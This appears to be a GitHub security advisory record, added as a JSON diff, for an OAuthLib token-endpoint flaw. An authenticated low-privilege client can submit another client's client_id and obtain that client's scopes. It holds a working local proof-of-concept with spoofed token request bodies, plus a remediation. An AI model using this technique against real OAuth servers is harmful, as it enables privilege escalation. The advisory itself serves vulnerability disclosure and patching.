@@ -1,0 +1,115 @@
+{
+  "id": "GHSA-7984-qgvg-3j9c",
+  "modified": "2026-10-30T23:15:08.286894189Z",
+  "published": "2026-10-30T22:58:16Z",
+  "aliases": [
+    "CVE-2026-118669"
+  ],
+  "summary": "OAuthLib: Token grants can use attacker-supplied client_id for authorization after authenticating a different client",
+  "details": "## Summary\n\nOAuthlib's token grant handlers can authenticate one client while authorizing the grant type and requested scopes using a different, attacker-supplied `client_id` from the request body.\n\nIn affected token grant flows, `authenticate_client(request)` sets `request.client` to the authenticated client object, but OAuthlib does not require `request.client_id` to match `request.client.client_id`. If the request body already contains `client_id=...`, OAuthlib keeps that value and passes it to `validate_grant_type()` and `validate_scopes()`.\n\nAs a result, an authenticated low-privilege confidential client can authenticate as itself, submit another client's `client_id` in the token request body, and cause grant and scope validation to run under that other client identity.\n\n## Affected Surface\n\nThe affected public surface is the OAuth2 token endpoint handling for:\n\n- `client_credentials`\n- `password` / Resource Owner Password Credentials\n\nThe issue is relevant to OAuthlib provider deployments where:\n\n- the attacker has credentials for one valid lower-privilege confidential client;\n- another client has broader grants or scopes;\n- the application validator uses the `client_id` argument passed by OAuthlib in `validate_grant_type()` or `validate_scopes()`, as the `RequestValidator` API is designed to support.\n\nDeployments whose validators ignore the `client_id` argument and authorize only from `request.client` may not be affected.\n\n## Details\n\n`Request` parses query and body parameters into request attributes, including `client_id`:\n\n- https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/common.py#L360-L397\n\nThe `RequestValidator.authenticate_client()` contract requires the integrator to authenticate the client and set `request.client`:\n\n- https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/request_validator.py#L41-L66\n\nFor the `client_credentials` grant, OAuthlib authenticates the client, verifies that `request.client` has a `client_id`, then performs grant and scope validation before normalizing `request.client_id` from `request.client.client_id`:\n\n- https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py#L106-L119\n\nThe problematic order is:\n\n```python\nif not self.request_validator.authenticate_client(request):\n    ...\nelif not hasattr(request.client, 'client_id'):\n    ...\n\nself.validate_grant_type(request)\n\nrequest.client_id = request.client_id or request.client.client_id\nself.validate_scopes(request)\n```\n\nBecause OAuthlib only fills `request.client_id` when it is missing, an attacker-supplied body value such as `client_id=high` survives even when `request.client.client_id == \"low\"`.\n\nThe shared grant helper then authorizes using `request.client_id`, while passing the authenticated client object separately:\n\n- `validate_grant_type(request.client_id, request.grant_type, request.client, request)`: https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/base.py#L152-L162\n- `validate_scopes(request.client_id, request.scopes, request.client, request)`: https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/base.py#L164-L176\n\nThe same identity split exists in the Resource Owner Password Credentials flow. After client authentication and user validation, OAuthlib validates the grant and scopes before replacing a missing `request.client_id` from `request.client.client_id`:\n\n- https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py#L87-L97\n- https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py#L178-L195\n\nThis creates an inconsistent identity state:\n\n```text\nrequest.client.client_id == \"low\"   # authenticated client\nrequest.client_id == \"high\"         # attacker-supplied request parameter\n```\n\nOAuthlib then calls application authorization hooks with both values, but uses the attacker-controlled `request.client_id` as the first-class `client_id` argument.\n\n## Impact\n\nAn authenticated lower-privilege confidential client can obtain tokens authorized under another client's grant and scope policy if the application's validator follows the `RequestValidator` API and authorizes by the `client_id` argument.\n\nConcrete impact can include:\n\n- issuing access tokens with scopes not assigned to the authenticated client;\n- allowing a low-privilege client to use a grant type reserved for a higher-privilege client;\n- persisting tokens under a spoofed `client_id` while the authenticated client object is different.\n\nThis is a token authorization bypass, not an unauthenticated attack. The attacker needs valid credentials for one client.\n\n## PoC\n\nCreate the following files in an empty directory.\n\n`requirements.txt`:\n\n```text\noauthlib==3.3.1\n```\n\n`repro.py`:\n\n```python\nimport base64\nimport json\n\nfrom oauthlib.oauth2 import (\n    BearerToken,\n    ClientCredentialsGrant,\n    RequestValidator,\n    ResourceOwnerPasswordCredentialsGrant,\n    TokenEndpoint,\n)\n\n\nclass Client:\n    def __init__(self, client_id):\n        self.client_id = client_id\n\n\nCLIENTS = {\n    \"low\": {\n        \"secret\": \"low-secret\",\n        \"grants\": {\"client_credentials\", \"password\"},\n        \"scopes\": {\"read\"},\n    },\n    \"high\": {\n        \"secret\": \"high-secret\",\n        \"grants\": {\"client_credentials\", \"password\"},\n        \"scopes\": {\"read\", \"admin\"},\n    },\n}\n\n\nclass DemoValidator(RequestValidator):\n    def __init__(self):\n        self.saved_tokens = []\n\n    def authenticate_client(self, request, *args, **kwargs):\n        authorization = request.headers.get(\"Authorization\", \"\")\n        prefix = \"Basic \"\n        if not authorization.startswith(prefix):\n            return False\n\n        decoded = base64.b64decode(authorization[len(prefix):]).decode(\"utf-8\")\n        client_id, secret = decoded.split(\":\", 1)\n        record = CLIENTS.get(client_id)\n        if record is None or record[\"secret\"] != secret:\n            return False\n\n        # This is the authenticated client identity.\n        request.client = Client(client_id)\n        return True\n\n    def client_authentication_required(self, request, *args, **kwargs):\n        return True\n\n    def validate_grant_type(self, client_id, grant_type, client, request, *args, **kwargs):\n        record = CLIENTS.get(client_id)\n        return record is not None and grant_type in record[\"grants\"]\n\n    def validate_scopes(self, client_id, scopes, client, request, *args, **kwargs):\n        record = CLIENTS.get(client_id)\n        return record is not None and set(scopes or []) \u003c= record[\"scopes\"]\n\n    def get_default_scopes(self, client_id, request, *args, **kwargs):\n        return []\n\n    def validate_user(self, username, password, client, request, *args, **kwargs):\n        if username == \"alice\" and password == \"wonderland\":\n            request.user = username\n            return True\n        return False\n\n    def save_bearer_token(self, token, request, *args, **kwargs):\n        self.saved_tokens.append({\n            \"token\": dict(token),\n            \"authenticated_client_id\": request.client.client_id,\n            \"request_client_id\": request.client_id,\n            \"scopes\": list(request.scopes or []),\n        })\n\n\nvalidator = DemoValidator()\ntoken = BearerToken(validator, expires_in=3600)\nendpoint = TokenEndpoint(\n    default_grant_type=\"client_credentials\",\n    default_token_type=token,\n    grant_types={\n        \"client_credentials\": ClientCredentialsGrant(validator),\n        \"password\": ResourceOwnerPasswordCredentialsGrant(validator),\n    },\n)\n\n\ndef low_client_headers():\n    value = base64.b64encode(b\"low:low-secret\").decode(\"ascii\")\n    return {\"Authorization\": f\"Basic {value}\"}\n\n\ndef token_request(body):\n    _headers, response_body, status = endpoint.create_token_response(\n        \"https://auth.example/token\",\n        body=body,\n        headers=low_client_headers(),\n    )\n    return status, json.loads(response_body)\n\n\ndef assert_rejected(label, body):\n    status, response = token_request(body)\n    print(label, status, response)\n    if status == 200:\n        raise SystemExit(f\"{label}: expected rejection, got success\")\n\n\ndef assert_spoofed_success(label, body):\n    status, response = token_request(body)\n    print(label, status, response)\n    if status != 200:\n        raise SystemExit(f\"{label}: expected token, got {status} {response}\")\n    if response.get(\"scope\") != \"admin\":\n        raise SystemExit(f\"{label}: expected admin scope, got {response}\")\n\n    saved = validator.saved_tokens[-1]\n    if saved[\"authenticated_client_id\"] != \"low\":\n        raise SystemExit(f\"{label}: authenticated client changed unexpectedly: {saved}\")\n    if saved[\"request_client_id\"] != \"high\":\n        raise SystemExit(f\"{label}: spoofed request client_id was not preserved: {saved}\")\n\n\nassert_rejected(\n    \"control client_credentials as low requesting admin\",\n    \"grant_type=client_credentials\u0026client_id=low\u0026scope=admin\",\n)\nassert_spoofed_success(\n    \"spoofed client_credentials as low with client_id=high\",\n    \"grant_type=client_credentials\u0026client_id=high\u0026scope=admin\",\n)\n\nassert_rejected(\n    \"control password as low requesting admin\",\n    \"grant_type=password\u0026client_id=low\u0026username=alice\u0026password=wonderland\u0026scope=admin\",\n)\nassert_spoofed_success(\n    \"spoofed password as low with client_id=high\",\n    \"grant_type=password\u0026client_id=high\u0026username=alice\u0026password=wonderland\u0026scope=admin\",\n)\n\nprint(\"OAUTHLIB_CLIENT_ID_SPOOFING_CONFIRMED\")\nprint(json.dumps(validator.saved_tokens, indent=2, sort_keys=True))\n```\n\nRun:\n\n```bash\npython -m venv .venv\n. .venv/bin/activate\npython -m pip install -r requirements.txt\npython repro.py\n```\n\nExpected result:\n\n```text\ncontrol client_credentials as low requesting admin 400 {'error': 'invalid_scope'}\nspoofed client_credentials as low with client_id=high 200 {'access_token': '...', 'expires_in': 3600, 'token_type': 'Bearer', 'scope': 'admin'}\ncontrol password as low requesting admin 400 {'error': 'invalid_scope'}\nspoofed password as low with client_id=high 200 {'access_token': '...', 'expires_in': 3600, 'token_type': 'Bearer', 'scope': 'admin', 'refresh_token': '...'}\nOAUTHLIB_CLIENT_ID_SPOOFING_CONFIRMED\n```\n\nThe success condition is that both successful token responses are produced while the saved token state shows:\n\n```json\n{\n  \"authenticated_client_id\": \"low\",\n  \"request_client_id\": \"high\",\n  \"scopes\": [\"admin\"]\n}\n```\n\nThat demonstrates that the authenticated client is `low`, while grant and scope authorization used the attacker-supplied `client_id=high`.\n\n## Suggested Remediation\n\nAfter client authentication succeeds, OAuthlib should reject a token request if an explicit request `client_id` is present and does not match `request.client.client_id`.\n\nFor authenticated confidential-client flows, a safer invariant is:\n\n```python\nif request.client is not None:\n    if request.client_id is not None and request.client_id != request.client.client_id:\n        raise InvalidClientError(...)\n    request.client_id = request.client.client_id\n```\n\nThis should happen before `validate_grant_type()` and `validate_scopes()` are called.\n\nReporters:\n\n- liyi.zhou@sydney.edu.au (Liyi), https://lzhou1110.github.io/\n- ziyue0530@gmail.com (Ziyue), https://zyy0530.github.io/\n- cshe0476@uni.sydney.edu.au (Strick), https://str1ckl4nd.github.io/\n- chng0012@uni.sydney.edu.au (Maurice), http://maurice.busystar.org/\n- cyu210608@gmail.com (Chenchen), https://7thparkk.github.io/",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "oauthlib",
+        "purl": "pkg:pypi/oauthlib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.0.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.1.0",
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.3.0",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.3.8",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.1.0",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1",
+        "3.2.0",
+        "3.2.1",
+        "3.2.2",
+        "3.3.0",
+        "3.3.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-7984-qgvg-3j9c/GHSA-7984-qgvg-3j9c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/oauthlib/oauthlib/security/advisories/GHSA-7984-qgvg-3j9c"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118669"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oauthlib/oauthlib/pull/920"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oauthlib/oauthlib/commit/c951a1d09f99f14e3240973fa83c4f4287d4753d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/oauthlib/oauthlib"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oauthlib/oauthlib/releases/tag/v4.0.0"
+    }
+  ]
+}
